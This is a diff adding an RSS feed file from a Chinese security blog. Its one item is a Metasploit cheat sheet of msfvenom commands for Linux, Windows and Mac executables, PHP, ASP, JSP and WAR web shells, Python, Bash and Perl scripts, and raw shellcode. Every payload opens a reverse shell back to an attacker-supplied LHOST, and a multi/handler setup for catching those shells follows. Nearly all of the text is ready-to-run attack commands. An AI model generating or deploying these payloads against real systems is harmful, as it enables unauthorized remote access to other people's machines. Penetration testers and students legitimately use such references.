@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>msf on iceH&#39;s Blog</title>
+        <link>https://360rce.github.io/tags/msf/</link>
+        <description>Recent content in msf on iceH&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！</copyright>
+        <lastBuildDate>Sat, 22 Oct 2016 16:45:50 +0000</lastBuildDate><atom:link href="https://360rce.github.io/tags/msf/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>msf的各种生成payload命令</title>
+        <link>https://360rce.github.io/p/6zc1968c/</link>
+        <pubDate>Sat, 22 Oct 2016 16:45:50 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/6zc1968c/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/l8/wallhaven-l8jl2p.jpg" alt="Featured image of post msf的各种生成payload命令" /&gt;&lt;p&gt;Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.&lt;/p&gt;
+&lt;p&gt;List payloads&lt;/p&gt;
+&lt;p&gt;msfvenom -l&lt;/p&gt;
+&lt;h2 id=&#34;os-payloads&#34;&gt;Os Payloads:&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Linux&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.elf&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f exe &amp;gt; shell.exe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Mac&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f macho &amp;gt; shell.macho&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web-payloads&#34;&gt;Web Payloads：&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;PHP&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;  msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.php cat shell.php | pbcopy &amp;amp;&amp;amp; echo &#39;&amp;lt;?php &#39; | tr -d &#39;\n&#39; &amp;gt; shell.php &amp;amp;&amp;amp; pbpaste &amp;gt;&amp;gt; shell.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ASP&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f asp &amp;gt; shell.asp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;JSP&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.jsp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;WAR&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;  msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f war &amp;gt; shell.war&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;scripting-payloads&#34;&gt;Scripting Payloads:&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Python&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p cmd/unix/reverse_python LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.py&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Bash&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p cmd/unix/reverse_bash LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Perl&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p cmd/unix/reverse_perl LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.pl&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;shellcode&#34;&gt;Shellcode:&lt;/h2&gt;
+&lt;p&gt;For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Linux Based Shellcode&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Windows Based Shellcode&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Mac Based Shellcode&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;handlers&#34;&gt;Handlers：&lt;/h2&gt;
+&lt;p&gt;Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;  use exploit/multi/handler set PAYLOAD &amp;lt;Payload name&amp;gt; set LHOST &amp;lt;LHOST value&amp;gt; set LPORT &amp;lt;LPORT value&amp;gt; set ExitOnSession false exploit -j -z&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘&lt;/p&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
